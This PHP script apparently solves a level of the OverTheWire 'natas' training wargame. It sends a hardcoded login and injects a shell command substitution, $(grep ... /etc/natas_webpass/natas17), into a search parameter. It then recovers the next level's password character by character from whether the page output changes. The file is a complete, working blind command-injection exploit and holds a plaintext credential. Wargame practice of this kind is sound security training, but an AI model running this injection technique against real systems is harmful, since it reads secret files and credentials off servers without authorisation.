<?php

function get($url)
{
    $username = "natas16";
    $password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'GET'
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}

$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';

for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    //whirlpools$(grep a /etc/natas_webpass/natas17)
    $command = urlencode("whirlpools$(grep $character /etc/natas_webpass/natas17)");
    $r = get("http://natas16.natas.labs.overthewire.org/index.php?needle=$command");
    if (!strpos($r, "whirlpools"))
    {
        $library .= $character;
    }
}

var_dump($library);

$password = '';

for ($i = 0; $i < 32; $i++)
{
    for ($j = 0; $j < strlen($library); $j++)
    {
        $character = $library[$j];
        $command = urlencode("whirlpools$(grep ^$password$character /etc/natas_webpass/natas17)");
        $r = get("http://natas16.natas.labs.overthewire.org/index.php?needle=$command");
        if (!strpos($r, "whirlpools"))
        {
            $password .= $character;
            echo "$password\n";
        }
    }
}